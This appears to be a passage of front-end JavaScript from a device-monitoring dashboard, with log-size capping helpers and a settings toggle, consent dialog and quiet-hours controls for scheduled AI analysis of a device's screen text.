  for (let i = fresh.length - 1; i >= 0; i--) {
    const len = _aiFlatten([fresh[i]]).length + 1;
    if (size + len > AI_MAX_LOG_CHARS) break;
    kept.push(fresh[i]); size += len;
  }
  kept.reverse();   // back to chronological order
  return { capped: kept, wasCapped: true, total: fresh.length };
}
// Final safety clamp for the cumulative log string (keeps the most recent whole lines).
function _aiClampLogs(logs) {
  if (!logs || logs.length <= AI_MAX_LOG_CHARS) return logs || '';
  const tail = logs.slice(logs.length - AI_MAX_LOG_CHARS);
  const nl = tail.indexOf('\n');
  return nl >= 0 ? tail.slice(nl + 1) : tail;   // drop the partial leading line
}

// ── Scheduled Screen-text Analysis (every 6 hours) ────────────────────────────
// Per-device scheduled analysis running every 6 hours from the configured start time.
// Configurable quiet hours (default 23:00–07:00) skip analysis when the device is idle.
// This is a deliberate ZK exception: the owner explicitly consents via an in-app disclosure popup.
(async function _initScreentextSchedule() {
  const toggle = document.getElementById('screentext-schedule-toggle');
  const timeIn = document.getElementById('screentext-schedule-time');
  const quietDiv = document.getElementById('screentext-quiet-hours');
  const quietStart = document.getElementById('screentext-quiet-start');
  const quietEnd = document.getElementById('screentext-quiet-end');
  if (!toggle || !timeIn) return;

  function _parseTimeHour(val) { return parseInt((val || '00:00').split(':')[0], 10) || 0; }

  function _schedulePayload() {
    const [h, m] = (timeIn.value || '20:00').split(':').map(Number);
    return {
      enabled: toggle.checked,
      hour: h || 20, minute: m || 0,
      quietHoursStart: _parseTimeHour(quietStart?.value),
      quietHoursEnd: _parseTimeHour(quietEnd?.value),
      timeZoneOffsetMinutes: new Date().getTimezoneOffset(),
    };
  }

  toggle.addEventListener('change', async () => {
    if (!selectedDeviceId) { toggle.checked = false; return; }
    if (toggle.checked) {
      const confirmed = await new Promise(resolve => {
        let done = false;
        showConfirm({
          title: 'Enable Screen-Text Analysis (Every 6 Hours)',
          body:
            `<p>This schedules <strong>screen-text analysis every 6 hours</strong>, starting at the selected time.</p>` +
            `<p>When enabled, the device's screen text is analyzed by a third-party AI provider (` +
            `<strong>DeepSeek</strong> via OpenCode). For most devices the server analyzes the screen-text record it ` +
            `has already received; on zero-knowledge (ZK) devices the device itself decrypts and sends the screen text ` +
            `for analysis — that plaintext is <strong>not stored</strong>.</p>` +
            `<p><strong>Quiet hours</strong> (configurable, default 23:00–07:00) skip analysis when the device is likely idle. ` +
            `If the device is in deep sleep at a scheduled time, it will briefly wake to run the analysis and then return to sleep. ` +
            `If a run is ever missed (e.g. the device was offline), the server re-runs the analysis automatically.</p>` +
            `<p>The analysis report will be sent to you via your notification settings (email, push, or Signal).</p>` +
            `<p><strong>This is a deliberate privacy exception.</strong> When disabled, screen-text ` +
            `data stays encrypted and is only decrypted by your browser. Enabling this allows the screen text ` +
            `to be analyzed by the AI provider.</p>`,
          okLabel: 'Enable Schedule',
          okClass: 'btn-info',
          onConfirm: () => { done = true; resolve(true); },
        });
        const el = document.getElementById('confirmModal');
        el.addEventListener('hidden.bs.modal', function h() {
          el.removeEventListener('hidden.bs.modal', h);
          if (!done) resolve(false);
        });
      });
      if (!confirmed) { toggle.checked = false; return; }
    }
    timeIn.style.display = toggle.checked ? '' : 'none';
    if (quietDiv) quietDiv.style.display = toggle.checked ? '' : 'none';
    try {
      await fetch(`/api/devices/${selectedDeviceId}/screentext-schedule`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(_schedulePayload()),
      });
    } catch (e) { console.warn('screentext-schedule save error:', e); }
  });

  timeIn.addEventListener('change', async () => {
    if (!selectedDeviceId || !toggle.checked) return;
    try {
      await fetch(`/api/devices/${selectedDeviceId}/screentext-schedule`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(_schedulePayload()),
      });
    } catch (e) { console.warn('screentext-schedule time save error:', e); }
  });

  // Save on quiet hours change
  [quietStart, quietEnd].forEach(el => {
    if (!el) return;
    el.addEventListener('change', async () => {
      if (!selectedDeviceId || !toggle.checked) return;
      try {
        await fetch(`/api/devices/${selectedDeviceId}/screentext-schedule`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(_schedulePayload()),
        });
      } catch (e) { console.warn('screentext-schedule quiet hours save error:', e); }
    });
  });

  // Load state on device select
  window._loadScreentextSchedule = async function(devId) {
    if (!devId) {
      toggle.checked = false; timeIn.style.display = 'none';
      if (quietDiv) quietDiv.style.display = 'none';
      return;
    }
    try {
      const r = await fetch(`/api/devices/${devId}/screentext-schedule`).then(r => r.json());
      toggle.checked = !!r.enabled;
      timeIn.value = `${String(r.hour ?? 20).padStart(2, '0')}:${String(r.minute ?? 0).padStart(2, '0')}`;
      timeIn.style.display = r.enabled ? '' : 'none';
      if (quietDiv) quietDiv.style.display = r.enabled ? '' : 'none';
      if (quietStart) quietStart.value = `${String(r.quietHoursStart ?? 23).padStart(2, '0')}:00`;
      if (quietEnd) quietEnd.value = `${String(r.quietHoursEnd ?? 7).padStart(2, '0')}:00`;
    } catch {
      toggle.checked = false; timeIn.style.display = 'none';
      if (quietDiv) quietDiv.style.display = 'none';
    }
  };
})();

